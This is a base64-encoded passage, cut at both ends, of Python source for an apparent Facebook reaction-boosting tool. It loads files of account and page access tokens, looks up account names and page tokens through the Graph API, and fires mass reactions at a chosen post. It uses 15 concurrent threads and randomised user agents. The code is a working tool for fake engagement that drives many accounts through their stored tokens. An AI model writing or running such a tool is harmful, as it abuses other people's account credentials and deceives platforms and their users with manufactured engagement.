JvdW5kIGlmIG5lZWRlZAoKICAgIHByaW50KGYiUmVhY3Rpb25zIGNvbXBsZXRlISB7cmVhY3Rpb25zX2NvdW50fSByZWFjdGlvbnMgd2VyZSBzdWNjZXNzZnVsbHkgc2VudC4iKQogICAgcHJpbnQoZiJUb3RhbCByZWFjdGlvbnMgc2VudDoge3JlYWN0aW9uc19jb3VudH0gb3V0IG9mIHtudW1fcmVhY3Rpb25zfSIpCgoKIyBSdW4gdGhlIHJlYWN0aW9uIGZ1bmN0aW9uICh0aGlzIHdvdWxkIGJlIGNhbGxlZCBpbiB5b3VyIHByb2dyYW0pCgoKCgoKaW1wb3J0IHJlcXVlc3RzCgpkZWYgZmV0Y2hfYWNjb3VudF9pbmZvKGZpbGVfb3B0aW9ucyk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9Q0hPT1NFIFdISUNIIEZJTEUgWU9VIFdBTlQgVE8gQ0hFQ0s6IikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZm9yIGtleSwgdmFsdWUgaW4gZmlsZV9vcHRpb25zLml0ZW1zKCk6CiAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9W3trZXl9XSB7eWVsbG93fXt2YWx1ZS5zcGxpdCgnLycpWy0xXX0iKSAgIyBEaXNwbGF5IG9ubHkgdGhlIGZpbGVuYW1lCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfY2hvaWNlID0gaW50KGlucHV0KGYiICB7cmVkfUNob29zZTogIikpCiAgICBhY2NvdW50c19maWxlID0gZmlsZV9vcHRpb25zLmdldChmaWxlX2Nob2ljZSkKCiAgICBpZiBhY2NvdW50c19maWxlIGlzIE5vbmU6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihhY2NvdW50c19maWxlLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGFjY291bnRzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICAgICBmb3IgYWNjb3VudCBpbiBhY2NvdW50czoKICAgICAgICAgICAgdWlkLCB0b2tlbiA9IGFjY291bnQuc3RyaXAoKS5zcGxpdCgnfCcpCgogICAgICAgICAgICAjIEZldGNoaW5nIGFjY291bnQgaW5mbyB1c2luZyB0aGUgdG9rZW4KICAgICAgICAgICAgYWNjb3VudF9pbmZvID0gZ2V0X2FjY291bnRfaW5mbyh0b2tlbikKICAgICAgICAgICAgaWYgYWNjb3VudF9pbmZvOgogICAgICAgICAgICAgICAgYWNjb3VudF9uYW1lID0gYWNjb3VudF9pbmZvLmdldCgnbmFtZScsICdObyBuYW1lIGF2YWlsYWJsZScpCiAgICAgICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgICAgIHByaW50KGYiICAgICB7eWVsbG93fUFDQ09VTlQgTkFNRSB7cmVkfToge2dyZWVufXthY2NvdW50X25hbWV9IikKCiAgICAgICAgICAgICAgICAjIE9wdGlvbmFsbHksIHlvdSBjYW4gYWxzbyBmZXRjaCBwYWdlcyBhc3NvY2lhdGVkIHdpdGggdGhlIGFjY291bnQKICAgICAgICAgICAgICAgIHBhZ2VzID0gZXh0cmFjdF9mYl9wYWdlcyh0b2tlbikKICAgICAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAgICAgICB7eWVsbG93fVBBR0VTIEFTU09DSUFURUQgV0lUSCB7d2hpdGV9OiB7cmVkfXthY2NvdW50X25hbWV9IikKICAgICAgICAgICAgICAgICAgICBmb3IgcGFnZSBpbiBwYWdlczoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAgICDwn5GJIHt5ZWxsb3d9e3BhZ2VbJ25hbWUnXX0ge3doaXRlfT0ge2dyZWVufVBBR0UgSUQ6IHtyZWR9e3BhZ2VbJ2lkJ119IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiICAgICB7cmVkfU5PIFBBR0VTIEFTU09DSUFURUQgV0lUSCBUSElTIEFDQ09VTlQgISAuIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9RkFJTEVEIFRPIEZFVENIIEFDQ09VTlQgSU5GT1JNQVRJT04gISB7d2hpdGV9PSB7cmVkfXt1aWR9IikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0ge3N0cihlKX0iKQoKZGVmIGdldF9hY2NvdW50X2luZm8odG9rZW4pOgogICAgdXJsID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOC4wL21lJwogICAgaGVhZGVycyA9IHsKICAgICAgICAnQXV0aG9yaXphdGlvbic6IGYnQmVhcmVyIHt0b2tlbn0nCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKSAgIyBSZXR1cm4gYWNjb3VudCBpbmZvIGFzIEpTT04KICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJbRVJST1JdIEVycm9yIGZldGNoaW5nIGFjY291bnQgaW5mbzoge3N0cihlKX0iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KCiAgICBwYWdlc19kYXRhID0gW10KICAgIAogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICBmb3IgcGFnZSBpbiBkYXRhLmdldCgnZGF0YScsIFtdKToKICAgICAgICAgICAgICAgIHBhZ2VzX2RhdGEuYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IHBhZ2UuZ2V0KCduYW1lJyksCiAgICAgICAgICAgICAgICAgICAgJ2FjY2Vzc1Rva2VuJzogcGFnZS5nZXQoJ2FjY2Vzc190b2tlbicpCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICByZXR1cm4gcGFnZXNfZGF0YQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiRmFpbGVkIHRvIGZldGNoIHBhZ2VzOiB7cmVzcG9uc2UudGV4dH0iKQogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiW0VSUk9SXSBFcnJvciBmZXRjaGluZyBwYWdlczoge3N0cihlKX0iKQogICAgICAgIHJldHVybiBOb25lCgojIEZpbGUgb3B0aW9ucyBtYXBwaW5nCmZpbGVfb3B0aW9ucyA9IHsKICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKfQoKIyBSdW4gdGhlIGFjY291bnQgaW5mbyBmZXRjaAoKCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKCmRlZiBwZXJmb3JtX3JlYWN0aW9uKHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKToKICAgICIiIlNlbmQgYSByZWFjdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3BsaXQoJ3wnKVsxXSAgIyBBc3N1bWluZyBmb3JtYXQgaXMgZW1haWx8YWNjZXNzX3Rva2VuCiAgICAKICAgIGF1dG9fcmVhY3QgPSBmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1aWRfdXJsfS9yZWFjdGlvbnM/dHlwZT17cmVhY3Rpb25fdHlwZX0mYWNjZXNzX3Rva2VuPXthY2Nlc3NfdG9rZW59JwogICAgaGVhZGVyc18gPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiBXX3VlcmFnbnQoKSAgIyBVc2UgdGhlIHJhbmRvbWx5IHNlbGVjdGVkIHVzZXIgYWdlbnQKICAgIH0KICAgIAogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhdXRvX3JlYWN0LCBoZWFkZXJzPWhlYWRlcnNfKQogICAgICAgIHJldHVybiBhY2Nlc3NfdG9rZW4sIHJlc3BvbnNlLnN0YXR1c19jb2RlLCByZXNwb25zZS50ZXh0ICAjIFJldHVybiB0aGUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgTm9uZSwgc3RyKGUpICAjIEhhbmRsZSByZXF1ZXN0IGV4Y2VwdGlvbnMKCmRlZiBwZXJmb3JtX3JlYWN0aW9uX2Zhc3QoKToKICAgICIiIlBlcmZvcm0gcmVhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIHJlYWN0aW9uIHR5cGUsIGFuZCBudW1iZXIgb2YgcmVhY3Rpb25zLiIiIgogICAgICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZpbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikgICMgRGlzcGxheSBvbmx5IHRoZSBmaWxlbmFtZQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfXtyZWR9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0gICMgVXNlIHRva2VucyBzdGFydGluZyBmcm9tIHRoZSBzZWxlY3RlZCBsaW5lCiAgICAKICAgIHByaW50KGYiICAgIHtncmVlbn1GT1JNQVQge3llbGxvd306IHtyZWR9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA3ODA0MzIyMjI2MC9wb3N0cy8xMTAxMDU2ODgyNjc1MzgvP21pYmV4dGlkPXJTNDBhQjdTOVVjYnh3NnYiKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICB6ID0gaW5wdXQoZiIgICB7Z3JlZW59RW50ZXIgdGhlIHBvc3QgbGluayBvciBJRDogIikKICAgIHBvc3RfaWQgPSBleHRyYWN0X2lkcyh6KQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICB1aWRfdXJsID0gcG9zdF9pZCAgCgogICAgcHJpbnQoZiIiIiAgICB7eWVsbG93fUNob29zZSB0aGUgcmVhY3Rpb24gdHlwZToKICAgICB7Ymx1ZX1bMV0ge2dyZWVufUxJS0UKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUxPVkUKICAgICB7Ymx1ZX1bM10ge2dyZWVufVdPVwogICAgIHtibHVlfVs0XSB7Z3JlZW59U0FECiAgICAge2JsdWV9WzVdIHtncmVlbn1BTkdSWQogICAgIHtibHVlfVs2XSB7Z3JlZW59SEFIQQogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIAogICAgdHJ5OgogICAgICAgIHJlYWN0aW9uX2Nob2ljZSA9IGludChpbnB1dChmIiAgICAge2dyZWVufUNob29zZTogIikpCiAgICAgICAgcmVhY3Rpb25fbWFwID0gewogICAgICAgICAgICAxOiAiTElLRSIsCiAgICAgICAgICAgIDI6ICJMT1ZFIiwKICAgICAgICAgICAgMzogIldPVyIsCiAgICAgICAgICAgIDQ6ICJTQUQiLAogICAgICAgICAgICA1OiAiQU5HUlkiLAogICAgICAgICAgICA2OiAiSEFIQSIKICAgICAgICB9CiAgICAgICAgcmVhY3Rpb25fdHlwZSA9IHJlYWN0aW9uX21hcC5nZXQocmVhY3Rpb25fY2hvaWNlLCBOb25lKQogICAgICAgIGlmIHJlYWN0aW9uX3R5cGUgaXMgTm9uZToKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgcmVhY3Rpb24gY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgCiAgICB0cnk6CiAgICAgICAgbnVtX3JlYWN0aW9ucyA9IGludChpbnB1dChmIiAgICAge3llbGxvd31FbnRlciB0aGUgbnVtYmVyIG9mIHJlYWN0aW9uczogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGZvciByZWFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICBtYXhfd29ya2VycyA9IDE1ICAjIFNldCBhIGxpbWl0IGZvciB0aGUgbnVtYmVyIG9mIGNvbmN1cnJlbnQgdGhyZWFkcwogICAgcmVhY3Rpb25zX2NvdW50ID0gMCAgIyBDb3VudGVyIGZvciBzdWNjZXNzZnVsIHJlYWN0aW9ucwogICAgdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPSAwCiAgICByZXN1bHRzID0gW10gICMgU3RvcmUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCgogICAgdG9rZW5zX3VzZWQgPSAwICAjIFRyYWNrIHRoZSB0b3RhbCBudW1iZXIgb2YgdG9rZW5zIHVzZWQKICAgIAogICAgIyBLZWVwIHByb2Nlc3NpbmcgdG9rZW5zIHVudGlsIHdlIHJlYWNoIHRoZSBzdWNjZXNzZnVsIHJlYWN0aW9uIGxpbWl0CiAgICB3aGlsZSB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9ucyA8IG51bV9yZWFjdGlvbnMgYW5kIHRva2Vuc191c2VkIDwgYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICByZW1haW5pbmdfdG9rZW5zID0gdG9rZW5zW3Rva2Vuc191c2VkOl0gICMgR2V0IHRoZSByZW1haW5pbmcgdG9rZW5zCiAgICAgICAgdG9rZW5zX2JhdGNoID0gcmVtYWluaW5nX3Rva2Vuc1s6bnVtX3JlYWN0aW9ucyAtIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zXSAgIyBHZXQgb25seSB0aGUgbmVlZGVkIHRva2VucwogICAgICAgIAogICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge2V4ZWN1dG9yLnN1Ym1pdChwZXJmb3JtX3JlYWN0aW9uLCB0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSk6IHRva2VuIGZvciB0b2tlbiBpbiB0b2tlbnNfYmF0Y2h9CgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGFzX2NvbXBsZXRlZChmdXR1cmVfdG9fdG9rZW4pOgogICAgICAgICAgICAgICAgdG9rZW4gPSBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXQogICAgICAgICAgICAgICAgdWlkID0gdG9rZW4uc3BsaXQoJ3wnKVswXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiwgc3RhdHVzX2NvZGUsIHJlc3BvbnNlX3RleHQgPSBmdXR1cmUucmVzdWx0KCkKICAgICAgICAgICAgICAgICAgICBpZiBzdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0aW9uc19jb3VudCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiICAgICB7cmVkfVtSRUFDVE9SXSB7eWVsbG93fXt1aWR9ICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIA+IHtncmVlbn1TVUNDRVNTRlVMTFkgUkVBQ1RFRCEiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilID